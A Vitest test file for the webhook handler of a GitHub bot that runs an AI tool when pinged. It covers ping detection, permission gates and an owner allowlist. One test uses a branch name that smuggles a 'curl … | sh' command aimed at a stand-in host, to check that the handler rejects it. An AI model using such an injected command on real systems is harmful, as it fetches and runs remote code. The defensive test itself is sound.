import { describe, it, expect, vi } from 'vitest'
import { handleEvent } from '../../../src/agent/webhook/handler'

const botHandle = 'autovibe-rator'

const repo = {
  name: 'autovibe-rator',
  full_name: 'FileJunkie/autovibe-rator',
  owner: { login: 'FileJunkie' },
  html_url: 'https://github.com/FileJunkie/autovibe-rator',
  clone_url: 'https://github.com/FileJunkie/autovibe-rator.git',
}

const issuesOpenedPayload = {
  action: 'opened',
  issue: {
    number: 42,
    title: 'Bug report',
    body: '@autovibe-rator please review this',
    user: { login: 'user1' },
  },
  repository: repo,
}

const issuesOpenedNoPingPayload = {
  action: 'opened',
  issue: {
    number: 42,
    title: 'Bug report',
    body: 'just a regular issue',
    user: { login: 'user1' },
  },
  repository: repo,
}

const issueCommentCreatedPayload = {
  action: 'created',
  issue: {
    number: 42,
    title: 'Bug report',
    body: 'original issue body',
    user: { login: 'user1' },
  },
  comment: {
    body: '@autovibe-rator check this please',
    user: { login: 'user2' },
  },
  repository: repo,
}

const prOpenedPayload = {
  action: 'opened',
  pull_request: {
    number: 7,
    title: 'Fix bug',
    body: '@autovibe-rator review this PR',
    head: { ref: 'fix-bug' },
    user: { login: 'user1' },
  },
  repository: repo,
}

const prSynchronizePayload = {
  action: 'synchronize',
  pull_request: {
    number: 7,
    title: 'Fix bug',
    body: '@autovibe-rator review the updates',
    head: { ref: 'fix-bug' },
    user: { login: 'user1' },
  },
  repository: repo,
}

const botAuthorPayload = {
  action: 'opened',
  issue: {
    number: 42,
    title: 'Bug report',
    body: '@autovibe-rator review this',
    user: { login: 'autovibe-rator[bot]' },
  },
  repository: repo,
}

function makeDeps() {
  return {
    invokeVibe: vi.fn().mockResolvedValue('## Review\n\nLooks good overall.'),
    postComment: vi.fn().mockResolvedValue(undefined),
    postReview: vi.fn().mockResolvedValue(undefined),
  }
}

describe('handleEvent - issues', () => {
  it('should process issues:opened when ping is present', async () => {
    const deps = makeDeps()
    const result = await handleEvent('issues', issuesOpenedPayload, { botHandle }, deps)

    expect(result.processed).toBe(true)
    expect(deps.invokeVibe).toHaveBeenCalledOnce()
    expect(deps.postComment).toHaveBeenCalledOnce()
    expect(deps.postReview).not.toHaveBeenCalled()
  })

  it('should not process issues:opened when ping is absent', async () => {
    const deps = makeDeps()
    const result = await handleEvent('issues', issuesOpenedNoPingPayload, { botHandle }, deps)

    expect(result.processed).toBe(false)
    expect(deps.invokeVibe).not.toHaveBeenCalled()
    expect(deps.postComment).not.toHaveBeenCalled()
    expect(deps.postReview).not.toHaveBeenCalled()
  })

  it('should call postComment with owner, repo, issueNumber, and vibe output', async () => {
    const deps = makeDeps()
    await handleEvent('issues', issuesOpenedPayload, { botHandle }, deps)

    expect(deps.postComment).toHaveBeenCalledWith({
      owner: 'FileJunkie',
      repo: 'autovibe-rator',
      issueNumber: 42,
      body: '## Review\n\nLooks good overall.',
    })
  })

  it('should call invokeVibe with repo URL, full name, event type, and issue number', async () => {
    const deps = makeDeps()
    await handleEvent('issues', issuesOpenedPayload, { botHandle }, deps)

    expect(deps.invokeVibe).toHaveBeenCalledWith(
      expect.objectContaining({
        repoUrl: 'https://github.com/FileJunkie/autovibe-rator.git',
        repoFullName: 'FileJunkie/autovibe-rator',
        eventType: 'issues',
        issueNumber: 42,
      }),
    )
  })

  it('should pass the issue body, title, mode, and issue branch to invokeVibe', async () => {
    const deps = makeDeps()
    await handleEvent('issues', issuesOpenedPayload, { botHandle }, deps)

    expect(deps.invokeVibe).toHaveBeenCalledWith(
      expect.objectContaining({
        commentBody: '@autovibe-rator please review this',
        title: 'Bug report',
        mode: 'issue',
        branch: 'autovibe-rator/issue-42',
      }),
    )
  })

  it('should not set pullNumber for issues', async () => {
    const deps = makeDeps()
    await handleEvent('issues', issuesOpenedPayload, { botHandle }, deps)

    const call = deps.invokeVibe.mock.calls[0][0]
    expect(call.pullNumber).toBeUndefined()
  })
})

describe('handleEvent - issue_comment', () => {
  it('should process issue_comment:created when ping is present', async () => {
    const deps = makeDeps()
    const result = await handleEvent('issue_comment', issueCommentCreatedPayload, { botHandle }, deps)

    expect(result.processed).toBe(true)
    expect(deps.invokeVibe).toHaveBeenCalledOnce()
    expect(deps.postComment).toHaveBeenCalledOnce()
    expect(deps.postReview).not.toHaveBeenCalled()
  })

  it('should use comment body and comment author for filtering', async () => {
    const deps = makeDeps()
    const payload = {
      action: 'created',
      issue: {
        number: 99,
        title: 'Some issue',
        body: 'no ping here',
        user: { login: 'user1' },
      },
      comment: {
        body: '@autovibe-rator please help',
        user: { login: 'commenter1' },
      },
      repository: repo,
    }
    const result = await handleEvent('issue_comment', payload, { botHandle }, deps)

    expect(result.processed).toBe(true)
  })

  it('should not process when comment has no ping', async () => {
    const deps = makeDeps()
    const payload = {
      action: 'created',
      issue: {
        number: 99,
        title: 'Some issue',
        body: 'original body',
        user: { login: 'user1' },
      },
      comment: {
        body: 'just a comment',
        user: { login: 'commenter1' },
      },
      repository: repo,
    }
    const result = await handleEvent('issue_comment', payload, { botHandle }, deps)

    expect(result.processed).toBe(false)
  })

  it('should pass the comment body (not the issue body) to invokeVibe', async () => {
    const deps = makeDeps()
    await handleEvent('issue_comment', issueCommentCreatedPayload, { botHandle }, deps)

    const call = deps.invokeVibe.mock.calls[0][0]
    expect(call.commentBody).toBe('@autovibe-rator check this please')
    expect(call.title).toBe('Bug report')
    expect(call.branch).toBe('autovibe-rator/issue-42')
    expect(call.mode).toBe('issue')
  })

  it('should treat a comment on a PR as PR work and resolve the head branch', async () => {
    const deps = makeDeps()
    deps.fetchPull = vi.fn().mockResolvedValue({ headRef: 'fix-bug', headRepoUrl: undefined })
    const payload = {
      action: 'created',
      issue: {
        number: 7,
        title: 'Fix bug',
        body: 'original body',
        user: { login: 'user1' },
        pull_request: { url: 'https://api.github.com/repos/FileJunkie/autovibe-rator/pulls/7' },
      },
      comment: {
        body: '@autovibe-rator also handle the edge case',
        user: { login: 'commenter1' },
      },
      repository: repo,
    }
    const result = await handleEvent('issue_comment', payload, { botHandle }, deps)

    expect(result.processed).toBe(true)
    expect(deps.fetchPull).toHaveBeenCalledWith({ owner: 'FileJunkie', repo: 'autovibe-rator', pullNumber: 7 })
    const call = deps.invokeVibe.mock.calls[0][0]
    expect(call.mode).toBe('pr')
    expect(call.branch).toBe('fix-bug')
    expect(call.issueNumber).toBe(7)
  })

  it('should not process a PR comment when the head branch cannot be resolved', async () => {
    const deps = makeDeps()
    deps.fetchPull = vi.fn().mockRejectedValue(new Error('not found'))
    const payload = {
      action: 'created',
      issue: {
        number: 7,
        title: 'Fix bug',
        body: 'original body',
        user: { login: 'user1' },
        pull_request: { url: 'https://api.github.com/repos/FileJunkie/autovibe-rator/pulls/7' },
      },
      comment: {
        body: '@autovibe-rator help',
        user: { login: 'commenter1' },
      },
      repository: repo,
    }
    const result = await handleEvent('issue_comment', payload, { botHandle }, deps)

    expect(result.processed).toBe(false)
    expect(deps.invokeVibe).not.toHaveBeenCalled()
  })

  it('should post comment with issue number from the issue, not a separate field', async () => {
    const deps = makeDeps()
    await handleEvent('issue_comment', issueCommentCreatedPayload, { botHandle }, deps)

    expect(deps.postComment).toHaveBeenCalledWith(
      expect.objectContaining({
        issueNumber: 42,
      }),
    )
  })
})

describe('handleEvent - pull_request', () => {
  it('should process pull_request:opened when ping is present', async () => {
    const deps = makeDeps()
    const result = await handleEvent('pull_request', prOpenedPayload, { botHandle }, deps)

    expect(result.processed).toBe(true)
    expect(deps.invokeVibe).toHaveBeenCalledOnce()
    expect(deps.postReview).toHaveBeenCalledOnce()
    expect(deps.postComment).not.toHaveBeenCalled()
  })

  it('should process pull_request:synchronize when ping is present', async () => {
    const deps = makeDeps()
    const result = await handleEvent('pull_request', prSynchronizePayload, { botHandle }, deps)

    expect(result.processed).toBe(true)
    expect(deps.postReview).toHaveBeenCalledOnce()
  })

  it('should call postReview with owner, repo, pullNumber, and vibe output', async () => {
    const deps = makeDeps()
    await handleEvent('pull_request', prOpenedPayload, { botHandle }, deps)

    expect(deps.postReview).toHaveBeenCalledWith({
      owner: 'FileJunkie',
      repo: 'autovibe-rator',
      pullNumber: 7,
      body: '## Review\n\nLooks good overall.',
    })
  })

  it('should call invokeVibe with pullNumber set and issueNumber undefined', async () => {
    const deps = makeDeps()
    await handleEvent('pull_request', prOpenedPayload, { botHandle }, deps)

    const call = deps.invokeVibe.mock.calls[0][0]
    expect(call.pullNumber).toBe(7)
    expect(call.issueNumber).toBeUndefined()
  })

  it('should pass the PR body, title, mode, and the PR head branch to invokeVibe', async () => {
    const deps = makeDeps()
    await handleEvent('pull_request', prOpenedPayload, { botHandle }, deps)

    const call = deps.invokeVibe.mock.calls[0][0]
    expect(call.commentBody).toBe('@autovibe-rator review this PR')
    expect(call.title).toBe('Fix bug')
    expect(call.branch).toBe('fix-bug')
    expect(call.mode).toBe('pr')
  })

  it('should clone from the head repo when the PR comes from a fork', async () => {
    const deps = makeDeps()
    const payload = {
      action: 'opened',
      pull_request: {
        number: 7,
        title: 'Fix bug',
        body: '@autovibe-rator review this PR',
        head: {
          ref: 'fix-bug',
          repo: { clone_url: 'https://github.com/forker/autovibe-rator.git' },
        },
        user: { login: 'user1' },
      },
      repository: repo,
    }
    await handleEvent('pull_request', payload, { botHandle }, deps)

    const call = deps.invokeVibe.mock.calls[0][0]
    expect(call.repoUrl).toBe('https://github.com/forker/autovibe-rator.git')
    expect(call.branch).toBe('fix-bug')
  })

  it('should refuse a PR whose head branch name contains shell metacharacters', async () => {
    const deps = makeDeps()
    const payload = {
      action: 'opened',
      pull_request: {
        number: 7,
        title: 'Fix bug',
        body: '@autovibe-rator review this PR',
        head: {
          ref: 'evil";curl https://evil.example|sh;"',
        },
        user: { login: 'user1' },
      },
      repository: repo,
    }
    const result = await handleEvent('pull_request', payload, { botHandle }, deps)

    expect(result.processed).toBe(false)
    expect(deps.invokeVibe).not.toHaveBeenCalled()
  })

  it('should not process pull_request:opened without ping', async () => {
    const deps = makeDeps()
    const payload = {
      action: 'opened',
      pull_request: {
        number: 7,
        title: 'Fix bug',
        body: 'no ping here',
        user: { login: 'user1' },
      },
      repository: repo,
    }
    const result = await handleEvent('pull_request', payload, { botHandle }, deps)

    expect(result.processed).toBe(false)
    expect(deps.postReview).not.toHaveBeenCalled()
  })
})

describe('handleEvent - bot self-filter', () => {
  it('should not process when author is the bot itself', async () => {
    const deps = makeDeps()
    const result = await handleEvent('issues', botAuthorPayload, { botHandle }, deps)

    expect(result.processed).toBe(false)
    expect(deps.invokeVibe).not.toHaveBeenCalled()
  })
})

describe('handleEvent - author association gate', () => {
  const allowedAssociations = ['OWNER', 'MEMBER', 'COLLABORATOR']

  it('should process when the trigger author is an OWNER', async () => {
    const deps = makeDeps()
    const payload = {
      action: 'opened',
      issue: {
        number: 42,
        title: 'Bug report',
        body: '@autovibe-rator please review this',
        user: { login: 'user1', author_association: 'OWNER' },
      },
      repository: repo,
    }
    const result = await handleEvent('issues', payload, { botHandle, allowedAssociations }, deps)

    expect(result.processed).toBe(true)
    expect(deps.invokeVibe).toHaveBeenCalledOnce()
  })

  it('should not process when the trigger author is NONE (drive-by commenter)', async () => {
    const deps = makeDeps()
    const payload = {
      action: 'opened',
      issue: {
        number: 42,
        title: 'Bug report',
        body: '@autovibe-rator please review this',
        user: { login: 'rando', author_association: 'NONE' },
      },
      repository: repo,
    }
    const result = await handleEvent('issues', payload, { botHandle, allowedAssociations }, deps)

    expect(result.processed).toBe(false)
    expect(deps.invokeVibe).not.toHaveBeenCalled()
  })

  it('should use the comment author association for issue_comment events', async () => {
    const deps = makeDeps()
    const payload = {
      action: 'created',
      issue: {
        number: 42,
        title: 'Bug report',
        body: 'original body',
        user: { login: 'user1', author_association: 'OWNER' },
      },
      comment: {
        body: '@autovibe-rator check this please',
        user: { login: 'commenter1', author_association: 'NONE' },
      },
      repository: repo,
    }
    const result = await handleEvent('issue_comment', payload, { botHandle, allowedAssociations }, deps)

    expect(result.processed).toBe(false)
    expect(deps.invokeVibe).not.toHaveBeenCalled()
  })
})

describe('handleEvent - permission fallback when payload lacks author_association', () => {
  // Webhook deliveries often omit author_association on user objects.
  const gated = { botHandle, allowedAssociations: ['OWNER', 'MEMBER', 'COLLABORATOR'] }

  function payloadWithoutAssociation() {
    return {
      action: 'opened',
      issue: {
        number: 42,
        title: 'Bug report',
        body: '@autovibe-rator please review this',
        user: { login: 'user1' },
      },
      repository: repo,
    }
  }

  it('should process when the API reports admin permission', async () => {
    const deps = makeDeps()
    deps.getPermission = vi.fn().mockResolvedValue('admin')
    const result = await handleEvent('issues', payloadWithoutAssociation(), gated, deps)

    expect(result.processed).toBe(true)
    expect(deps.getPermission).toHaveBeenCalledWith({ owner: 'FileJunkie', repo: 'autovibe-rator', username: 'user1' })
  })

  it('should process when the API reports write permission', async () => {
    const deps = makeDeps()
    deps.getPermission = vi.fn().mockResolvedValue('write')
    const result = await handleEvent('issues', payloadWithoutAssociation(), gated, deps)

    expect(result.processed).toBe(true)
  })

  it('should not process when the API reports read-only permission', async () => {
    const deps = makeDeps()
    deps.getPermission = vi.fn().mockResolvedValue('read')
    const result = await handleEvent('issues', payloadWithoutAssociation(), gated, deps)

    expect(result.processed).toBe(false)
    expect(deps.invokeVibe).not.toHaveBeenCalled()
  })

  it('should not process when the permission lookup fails (fail closed)', async () => {
    const deps = makeDeps()
    deps.getPermission = vi.fn().mockRejectedValue(new Error('404'))
    const result = await handleEvent('issues', payloadWithoutAssociation(), gated, deps)

    expect(result.processed).toBe(false)
    expect(deps.invokeVibe).not.toHaveBeenCalled()
  })

  it('should not process when the gate is active and no getPermission dep exists', async () => {
    const deps = makeDeps()
    const result = await handleEvent('issues', payloadWithoutAssociation(), gated, deps)

    expect(result.processed).toBe(false)
    expect(deps.invokeVibe).not.toHaveBeenCalled()
  })
})

describe('handleEvent - owner allowlist', () => {
  it('should process a repo owned by an allowed owner', async () => {
    const deps = makeDeps()
    const result = await handleEvent('issues', issuesOpenedPayload, { botHandle, allowedOwners: ['FileJunkie'] }, deps)

    expect(result.processed).toBe(true)
    expect(deps.invokeVibe).toHaveBeenCalledOnce()
  })

  it('should not process a repo owned by someone else', async () => {
    const deps = makeDeps()
    const otherRepo = {
      ...repo,
      full_name: 'Stranger/autovibe-rator',
      owner: { login: 'Stranger' },
    }
    const payload = { ...issuesOpenedPayload, repository: otherRepo }
    const result = await handleEvent('issues', payload, { botHandle, allowedOwners: ['FileJunkie'] }, deps)

    expect(result.processed).toBe(false)
    expect(deps.invokeVibe).not.toHaveBeenCalled()
  })
})

describe('handleEvent - unknown events', () => {
  it('should not process unknown event types', async () => {
    const deps = makeDeps()
    const result = await handleEvent('push', { action: '', repository: repo }, { botHandle }, deps)

    expect(result.processed).toBe(false)
    expect(deps.invokeVibe).not.toHaveBeenCalled()
  })

  it('should not process unsupported actions', async () => {
    const deps = makeDeps()
    const payload = {
      action: 'closed',
      issue: {
        number: 42,
        title: 'Bug',
        body: '@autovibe-rator review',
        user: { login: 'user1' },
      },
      repository: repo,
    }
    const result = await handleEvent('issues', payload, { botHandle }, deps)

    expect(result.processed).toBe(false)
    expect(deps.invokeVibe).not.toHaveBeenCalled()
  })
})

describe('handleEvent - result shape', () => {
  it('should return a reason string when processed', async () => {
    const deps = makeDeps()
    const result = await handleEvent('issues', issuesOpenedPayload, { botHandle }, deps)

    expect(typeof result.reason).toBe('string')
    expect(result.reason.length).toBeGreaterThan(0)
  })

  it('should return a reason string when not processed', async () => {
    const deps = makeDeps()
    const result = await handleEvent('push', { action: '', repository: repo }, { botHandle }, deps)

    expect(typeof result.reason).toBe('string')
    expect(result.reason.length).toBeGreaterThan(0)
  })

  it('should include vibeOutput when processed', async () => {
    const deps = makeDeps()
    const result = await handleEvent('issues', issuesOpenedPayload, { botHandle }, deps)

    expect(result.vibeOutput).toBe('## Review\n\nLooks good overall.')
  })

  it('should not include vibeOutput when not processed', async () => {
    const deps = makeDeps()
    const result = await handleEvent('issues', issuesOpenedNoPingPayload, { botHandle }, deps)

    expect(result.vibeOutput).toBeUndefined()
  })
})
